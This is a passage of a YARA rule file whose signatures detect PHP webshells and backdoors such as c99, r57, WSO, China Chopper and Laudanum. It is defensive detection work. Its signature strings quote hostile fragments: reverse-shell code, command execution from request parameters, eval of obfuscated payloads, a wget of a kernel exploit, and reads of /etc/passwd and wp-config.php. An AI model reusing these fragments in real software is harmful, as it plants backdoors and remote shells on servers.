        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s6 = "if((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000386
{
    meta:
        description = "auto-generated simple_php_backdoor.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he"
        $s6 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn"
        $s9 = "// a simple php backdoor"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000387
{
    meta:
        description = "auto-generated phpshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "echo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><b"
        $s2 = "$img[$id] = \"<img height=\\\"16\\\" width=\\\"16\\\" border=\\\"0\\\" src=\\\"$REMOTE_IMAGE_UR"
        $s3 = "$file = str_replace(\"\\\\\", \"/\", str_replace(\"//\", \"/\", str_replace(\"\\\\\\\\\", \"\\\\\", "
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000388
{
    meta:
        description = "auto-generated phpft.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s6 = "PHP Files Thief"
        $s11 = "http://www.4ngel.net"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000389
{
    meta:
        description = "auto-generated r57shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s11 = " $_POST['cmd']=\"echo \\\"Now script try connect to"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000390
{
    meta:
        description = "auto-generated index3.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s8 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"You"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000391
{
    meta:
        description = "auto-generated phvayv.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "wrap=\"OFF\">XXXX</textarea></font><font face"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000392
{
    meta:
        description = "auto-generated casus15.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "copy ( $dosya_gonder"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000393
{
    meta:
        description = "auto-generated remview.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<xmp>$out</"
        $s1 = ".mm(\"Eval PHP code\")."
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000394
{
    meta:
        description = "auto-generated r57.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']."
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000395
{
    meta:
        description = "auto-generated phvayv.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "rows=\"24\" cols=\"122\" wrap=\"OFF\">XXXX</textarea></font><font"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000396
{
    meta:
        description = "Webshells Auto-generated__BackDooR (fr).php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s3 = "print(\"<p align=\\\"center\\\"><font size=\\\"5\\\">Exploit include "
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000397
{
    meta:
        description = "auto-generated nstview.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s4 = "open STDIN,\\\"<&X\\\";open STDOUT,\\\">&X\\\";open STDERR,\\\">&X\\\";exec(\\\"/bin/sh -i\\\");"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000398
{
    meta:
        description = "auto-generated c99.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000399
{
    meta:
        description = "auto-generated shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz"
        $s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000400
{
    meta:
        description = "auto-generated webadmin.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000401
{
    meta:
        description = "auto-generated remview_2003_04_22.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\""
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000402
{
    meta:
        description = "auto-generated test.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "$yazi = \"test\" . \"\\r\\n\";"
        $s2 = "fwrite ($fp, \"$yazi\");"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000403
{
    meta:
        description = "auto-generated index3.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000404
{
    meta:
        description = "auto-generated xishell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s3 = "if (!$nix) { $xid = implode(explode(\"\\\\\",$xid),\"\\\\\\\\\");}echo (\"<td><a href='Java"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000405
{
    meta:
        description = "auto-generated usr.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000406
{
    meta:
        description = "auto-generated phpinj.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000407
{
    meta:
        description = "auto-generated sh.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "\"@$SERVER_NAME \".exec(\"pwd\")"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000408
{
    meta:
        description = "auto-generated phpinj.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000409
{
    meta:
        description = "auto-generated c99shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000410
{
    meta:
        description = "auto-generated phpshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
        $s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000411
{
    meta:
        description = "auto-generated r57shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        
    strings:
        $s1 = "<b>\".$_POST['cmd']"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000412
{
    meta:
        description = "hawkeye keyloggers php panel"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-12-14"
        
    strings:
        $s0 = "$fname = $_GET['fname'];" ascii
        $s1 = "$data = $_GET['data'];" ascii
        $s2 = "unlink($fname);" ascii
        $s3 = "echo \"Success\";" ascii
        
    condition:
        all of ($s*) and filesize < 600
}
rule Backdoor_Webshell_PHP_000413
{
    meta:
        description = "downloads content from pastebin.com.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-01-13"
        
    strings:
        $s0 = "file_get_contents(\"http://pastebin.com" ascii
        $s1 = "xcurl('http://pastebin.com/download.php" ascii
        $s2 = "xcurl('http://pastebin.com/raw.php" ascii
        
        $x0 = "if($content){unlink('evex.php');" ascii
        $x1 = "$fh2 = fopen(\"evex.php\", 'a');" ascii
        
        $y0 = "file_put_contents($pth" ascii
        $y1 = "echo \"<login_ok>" ascii
        $y2 = "str_replace('* @package Wordpress',$temp" ascii
        
    condition:
        1 of ($s*) or all of ($x*) or all of ($y*)
}
rule Backdoor_Webshell_PHP_000414
{
    meta:
        description = "27.9.txt, c66.php, c99-shadows-mod.php, c99.php ..."
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-01-11"
        
    strings:
        $s4 = "if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}" ascii
        $s6 = "@extract($_REQUEST[\"c99shcook\"]);" ascii
        $s7 = "if (!function_exists(\"c99_buff_prepare\"))" ascii
        
    condition:
        filesize < 685KB and 1 of them
}
rule Backdoor_Webshell_PHP_000415
{
    meta:
        description = "acid antisecshell_3.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-01-11"
        
    strings:
        $s0 = "echo \"<option value=delete\".($dspact == \"delete\"?\" selected\":\"\").\">Delete</option>\";" ascii
        $s1 = "if (!is_readable($o)) {return \"<font color=red>\".view_perms(fileperms($o)).\"</font>\";}" ascii
        
    condition:
        filesize < 900KB and all of them
}
rule Backdoor_Webshell_PHP_000416
{
    meta:
        description = "c99.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-01-11"
        
    strings:
        $s1 = "displaysecinfo(\"List of Attributes\",myshellexec(\"lsattr -a\"));" ascii
        $s2 = "displaysecinfo(\"RAM\",myshellexec(\"free -m\"));" ascii
        $s3 = "displaysecinfo(\"Where is perl?\",myshellexec(\"whereis perl\"));" ascii
        $s4 = "$ret = myshellexec($handler);" ascii
        $s5 = "if (posix_kill($pid,$sig)) {echo \"OK.\";}" ascii
        
    condition:
        filesize < 900KB and 1 of them
}
rule Backdoor_Webshell_PHP_000417
{
    meta:
        description = "r57shell_2.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-01-11"
        
    strings:
        $a0 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" ascii
        $a1 = "echo $lang[$language.'_text98'].$suc.\"\\r\\n\";" ascii
        
        $b0 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_"
        
    condition:
        (filesize < 900KB and all of ($a*)) or (all of ($b*))
}
rule Backdoor_Webshell_PHP_000418
{
    meta:
        description = "backdoor.php.agent.php, r57.mod-bizzz.shell.txt ..."
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-01-11"
        
    strings:
        $s1 = "$_POST['cmd'] = which('" ascii
        $s2 = "$blah = ex(" ascii
        
    condition:
        filesize < 600KB and all of them
}
rule Backdoor_Webshell_PHP_000419
{
    meta:
        description = "c100 v. 777shell"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-01-11"
        
    strings:
        $a0 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" ascii
        $a1 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" ascii
        $a2 = "cut -d: -f1,2,3 /etc/passwd | grep ::" ascii
        $a3 = "which wget curl w3m lynx" ascii
        $a4 = "netstat -atup | grep IST"  ascii
        
        $b0 = "if(eregi(\"./shbd $por\",$scan))"
        $b1 = "$_POST['backconnectip']"
        $b2 = "$_POST['backcconnmsg']"
        
    condition:
        (filesize < 685KB and 2 of ($a*)) or (1 of ($b*))
}
rule Backdoor_Webshell_PHP_000420
{
    meta:
        description = "poison sh3ll.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-01-11"
        
    strings:
        $s1 = "elseif ( enabled(\"exec\") ) { exec($cmd,$o); $output = join(\"\\r\\n\",$o); }" ascii
        
    condition:
        filesize < 550KB and all of them
}
rule Backdoor_Webshell_PHP_000421
{
    meta:
        description = "fatalisticz.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-01-11"
        
    strings:
        $s0 = "<form method=\"POST\"><input type=hidden name=act value=\"ls\">" ascii
        $s2 = "foreach($quicklaunch2 as $item) {" ascii
        
    condition:
        filesize < 882KB and all of them
}
rule Backdoor_Webshell_PHP_000422
{
    meta:
        description = "ayyildiz_dir.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-01-11"
        
    strings:
        $s0 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";" ascii
        $s1 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" ascii
        
    condition:
        filesize < 112KB and all of them
}
rule Backdoor_Webshell_PHP_000423
{
    meta:
        description = "uploadshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-09-10"
        
    strings:
        $s2 = "$lol = file_get_contents(\"../../../../../wp-config.php\");" ascii
        $s6 = "@unlink(\"./export-check-settings.php\");" ascii
        $s7 = "$xos = \"Safe-mode:[Safe-mode:\".$hsafemode.\"] " ascii
        
    condition:
        ( uint16(0) == 0x3f3c and filesize < 6KB and ( all of ($s*) ) ) or ( all of them )
}
rule Backdoor_Webshell_PHP_000424
{
    meta:
        description = "dkshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-09-10"
        
    strings:
        $s1 = "<?php Error_Reporting(0); $s_pass = \"" ascii
        $s2 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on" ascii
        
    condition:
        ( uint16(0) == 0x3c0a and filesize < 300KB and all of them )
}
rule Backdoor_Webshell_PHP_000425
{
    meta:
        description = "unknown.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-09-10"
        
    strings:
        $s1 = "$check = $_SERVER['DOCUMENT_ROOT']" ascii
        $s2 = "$fp=fopen(\"$check\",\"w+\");" ascii
        $s3 = "fwrite($fp,base64_decode('" ascii
        
    condition:
        ( uint16(0) == 0x6324 and filesize < 6KB and ( all of ($s*) ) ) or ( all of them )
}
rule Backdoor_Webshell_PHP_000426
{
    meta:
        description = "dkshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-09-10"
        
    strings:
        $x1 = "DK Shell - Took the Best made it Better..!!" ascii
        $x2 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
        $x3 = "echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';" ascii
        
        $s1 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" ascii
        $s9 = "$x = $_GET[\"x\"];" ascii
        
    condition:
        ( uint16(0) == 0x3f3c and filesize < 200KB and 1 of ($x*) ) or ( 3 of them )
}
rule Backdoor_Webshell_PHP_000427
{
    meta:
        description = "web_shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-09-10"
        
    strings:
        $a0 = "preg_replace(\"\\x2F\\x2E\\x2A\\x2F\\x65\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x" ascii
        $a1 = "input[type=text], input[type=password]{" ascii
        
        $b0 = "<die(\"Couldn't Read directory, Blocked!!!\");"
        $b1 = "PHP Web Shell"
        
        $c0 = "RhViRYOzz"
        $c1 = "d\\O!jWW"
        $c2 = "bc!jWW"
        $c3 = "0W[&{l"
        $c4 = "[INhQ@\\"
        
    condition:
        ( uint16(0) == 0x6c3c and filesize < 80KB and all of ($a*) ) or ( all of ($b*) ) or ( all of ($c*) )
}
rule Backdoor_Webshell_PHP_000428
{
    meta:
        description = "web_shell_mysql.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-09-10"
        
    strings:
        $x1 = "@exec('./bypass/ln -s /etc/passwd 1.php');" ascii
        $x2 = "echo \"<iframe src=mysqldumper/index.php width=100% height=100% frameborder=0></iframe> \";" ascii
        $x3 = "@exec('tar -xvf mysqldumper.tar.gz');" ascii
        
    condition:
        ( uint16(0) == 0x213c and filesize < 100KB and 1 of ($x*) ) or ( 2 of them )
}
rule Backdoor_Webshell_PHP_000429
{
    meta:
        description = "wso.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-09-10"
        
    strings:
        $s8 = "$default_charset='Wi'.'ndo.'.'ws-12'.'51';" ascii
        $s9 = "$mosimage_session = \"" ascii
        
    condition:
        ( uint16(0) == 0x3f3c and filesize < 300KB and all of them )
}
rule Backdoor_Webshell_PHP_000430
{
    meta:
        description = "a simple cloaked php web shell feb17.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2017-02-28"
        
    strings:
        $h1 = "<?php ${\"\\x" ascii
        
        $x1 = "\";global$auth;function sh_decrypt_phase($data,$key){${\"" ascii
        $x2 = "global$auth;return sh_decrypt_phase(sh_decrypt_phase($" ascii
        $x3 = "]}[\"\x64\"]);}}echo " ascii
        $x4 = "\"=>@phpversion(),\"\\x" ascii
        
        /* Decloaked version */
        $s1 = "$i=Array(\"pv\"=>@phpversion(),\"sv\"" ascii
        $s3 = "$data = @unserialize(sh_decrypt(@base64_decode($data),$data_key));" ascii
        
    condition:
        ( $h1 at 0 and 1 of them ) or 2 of them
}
rule Backdoor_Webshell_PHP_000431
{
    meta:
        description = "uses standard wordpress wp-config.php file and appends the malicious code in front of it"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2017-06-25"
        
    strings:
        $x1 = " * @package WordPress" ascii
        $s1 = "define('DB_NAME'," ascii
        $s2 = "require_once(ABSPATH . 'wp-settings.php');" ascii
        $fp1 = "iThemes Security Config" ascii
        
    condition:
        uint32(0) == 0x68703f3c and filesize < 400KB and $x1 and all of ($s*) and not $x1 in (0..1000) and not 1 of ($fp*)
}
rule Backdoor_Webshell_PHP_000432
{
    meta:
        description = "a pas webshell pas_encoded.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2017-07-11"
        
    strings:
        $head1 = "<?php $____=" ascii
        $head2 = "'base'.(32*2).'"
        $enc1 = "isset($_COOKIE['___']" ascii
        $enc2 = "if($___!==NULL){" ascii
        $enc3 = ").substr(md5(strrev($" ascii
        $enc4 = "]))%256);$" ascii
        $enc5 = "]))@setcookie('" ascii
        $enc6 = "]=chr(( ord($_" ascii
        $x1 = { 3D 0A 27 29 29 3B 69 66 28 69 73 73 65 74 28 24 5F 43 4F 4F 4B 49 45 5B 27 }
        $foot1 = "value=\"\"/><input type=\"submit\" value=\"&gt;\"/></form>"
        $foot2 = "();}} @header(\"Status: 404 Not Found\"); ?>"
        
    condition:
        ( uint32(0) == 0x68703f3c and filesize < 80KB and ( 3 of them or $head1 at 0 or $head2 in (0..20) or 1 of ($x*) ) ) or $foot1 at (filesize-52) or $foot2 at (filesize-44)
}
rule Backdoor_Webshell_PHP_000433
{
    meta:
        description = "often used by iranian apt groups.alfa_shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2017-09-21"
        
    strings:
        $x1 = "$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64')" ascii
        $x2 = "#solevisible@gmail.com" ascii
        $x3 = "'login_page' => '500',//gui or 500 or 403 or 404" ascii
        $x4 = "$GLOBALS['__ALFA__']" ascii
        $x5 = "if(!function_exists('b'.'as'.'e6'.'4_'.'en'.'co'.'de')" ascii
        $f1 = { 76 2F 38 76 2F 36 76 2F 2B 76 2F 2F 66 38 46 27 29 3B 3F 3E 0D 0A }
        
    condition:
        ( filesize < 900KB and 1 of ($x*) or $f1 at (filesize-22) )
}
rule Backdoor_Webshell_PHP_000434
{
    meta:
        description = "malware from nk apt incident de.fopo_obfuscation.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2017-11-17"
        
    strings:
        $x1 = "Obfuscation provided by FOPO" ascii
        
        $s1 = "\";@eval($" ascii
        $f1 = { 22 29 29 3B 0D 0A 3F 3E }
        
    condition:
        uint16(0) == 0x3f3c and filesize < 800KB and ( $x1 or ( $s1 in (0..350) and $f1 at (filesize-23) ) )
}
rule Backdoor_Webshell_PHP_000435
{
   meta:
        description = "pas tool php web kit mod.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-12-29"
        
   strings:
        $php = "<?php"
        $base64decode1 = "='base'.("
        $strreplace = "str_replace(\"\\n\", ''"
        $md5 = ".substr(md5(strrev("
        $gzinflate = "gzinflate"
        $cookie = "_COOKIE"
        $isset = "isset"
        
   condition:
        $php at 0 and (filesize > 10KB and filesize < 30KB) and #cookie == 2 and #isset == 3 and all of them
}
rule Backdoor_Webshell_PHP_000436
{
   meta:
        description = "pas tool php web kit v3.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-01-01"
        
   strings:
        $php = "<?php $"
        $php2 = "@assert(base64_decode($_REQUEST["
        
        $s1 = "(str_replace(\"\\n\", '', '"
        $s2 = "(strrev($" ascii
        $s3 = "de'.'code';" ascii
        
   condition:
        ( $php at 0 or $php2 ) and
        filesize > 8KB and filesize < 100KB and
        all of ($s*)
}
rule Backdoor_Webshell_PHP_000437
{
   meta:
        description = "pas tool php web kit v4.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2016-01-01"
        
   strings:
        $php = "<?php $"
        
        $s1 = "(StR_ReplAcE(\"\\n\",'',"
        $s2 = ";if(PHP_VERSION<'5'){" ascii
        $s3 = "=SuBstr_rePlACe(" ascii
        
   condition:
        $php at 0 and
        filesize > 8KB and filesize < 100KB and
        2 of ($s*)
}
rule Backdoor_Webshell_PHP_000438
{
    meta:
        description = "laudanum injector tools shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "command_hist[current_line] = document.shell.command.value;" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "array_unshift($_SESSION['history'], $command);" fullword ascii /* PEStudio Blacklist: strings */
        $s4 = "if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 40KB and all of them
}
rule Backdoor_Webshell_PHP_000439
{
    meta:
        description = "laudanum injector tools php-reverse-shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "printit(\"Successfully opened reverse shell to $ip:$port\");" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "$input = fread($pipes[1], $chunk_size);" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 15KB and all of them
}
rule Backdoor_Webshell_PHP_000440
{
    meta:
        description = "laudanum injector tools dns.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "$query = isset($_POST['query']) ? $_POST['query'] : '';" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "$result = dns_get_record($query, $types[$type], $authns, $addtl);" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii /* PEStudio Blacklist: strings */
        $s4 = "foreach (array_keys($types) as $t) {" fullword ascii
        
    condition:
        filesize < 15KB and all of them
}
rule Backdoor_Webshell_PHP_000441
{
    meta:
        description = "laudanum injector tools laudanum.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "public function __activate()" fullword ascii
        $s2 = "register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 5KB and all of them
}
rule Backdoor_Webshell_PHP_000442
{
    meta:
        description = "laudanum injector tools file.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "$allowedIPs =" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "<a href=\"<?php echo $_SERVER['PHP_SELF']  ?>\">Home</a><br/>" fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "$dir  = isset($_GET[\"dir\"])  ? $_GET[\"dir\"]  : \".\";" fullword ascii
        $s4 = "$curdir .= substr($curdir, -1) != \"/\" ? \"/\" : \"\";" fullword ascii
        
    condition:
        filesize < 10KB and all of them
}
rule Backdoor_Webshell_PHP_000443
{
    meta:
        description = "laudanum injector tools php-reverse-shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii /* PEStudio Blacklist: strings */
        $s7 = "$shell = 'uname -a; w; id; /bin/sh -i';" fullword ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 10KB and all of them
}
rule Backdoor_Webshell_PHP_000444
{
    meta:
        description = "china chopper webshells php and aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-03-10"
        
    strings:
        $aspx = /%@\sPage\sLanguage=.Jscript.%><%eval\(RequestItem\[.{,100}unsafe/
        $php = /<?php.\@eval\(\$_POST./
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000445
{
    meta:
        description = "cn honker pentest toolset php5.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user" ascii /* PEStudio Blacklist: strings */
        $s20 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$" ascii /* PEStudio Blacklist: strings */
        
    condition:
        uint16(0) == 0x3f3c and filesize < 300KB and all of them
}
rule Backdoor_Webshell_PHP_000446
{
    meta:
        description = "cn honker pentest toolset test3693.war"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "Process p=Runtime.getRuntime().exec(\"cmd /c \"+strCmd);" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - " ascii /* PEStudio Blacklist: strings */
        
    condition:
        uint16(0) == 0x4b50 and filesize < 50KB and all of them
}
rule Backdoor_Webshell_PHP_000447
{
    meta:
        description = "cn honker pentest toolset offlibrary.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "';$i=$g->query(\"SELECT SUBSTRING_INDEX(CURRENT_USER, '@', 1) AS User, SUBSTRING" ascii /* PEStudio Blacklist: strings */
        $s12 = "if(jushRoot){var script=document.createElement('script');script.src=jushRoot+'ju" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 1005KB and all of them
}
rule Backdoor_Webshell_PHP_000448
{
    meta:
        description = "cn honker pentest toolset linux.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "<form name=form1 action=exploit.php method=post>" fullword ascii /* PEStudio Blacklist: strings */
        $s1 = "<title>Changing CHMOD Permissions Exploit " fullword ascii
        
    condition:
        uint16(0) == 0x696c and filesize < 6KB and all of them
}
rule Backdoor_Webshell_PHP_000449
{
    meta:
        description = "cn honker pentest toolset php6.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-23"
        
    strings:
        $s0 = "eval(gzinflate(base64_decode('" ascii /* PEStudio Blacklist: strings */
        $s1 = "B1ac7Sky-->" fullword ascii
        
    condition:
